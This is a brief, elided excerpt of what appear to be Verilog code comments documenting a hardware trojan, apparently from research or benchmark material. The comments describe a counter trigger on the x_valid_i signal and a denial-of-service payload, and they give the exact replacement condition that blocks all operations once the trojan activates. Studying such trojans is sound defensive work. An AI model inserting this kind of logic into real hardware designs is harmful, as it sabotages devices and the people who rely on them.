 ...
 * 
 * Description:
 *   Disables operations by blocking x_valid_i control signal
 *   
 * Trigger: Counter on x_valid_i
 * Payload: Block x_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block x_valid_i when trojan is active
//
// IMPORTANT: x_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (x_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: x_valid_i && 0 = 0 (always false)
//   All operations controlled by x_valid_i are blocked
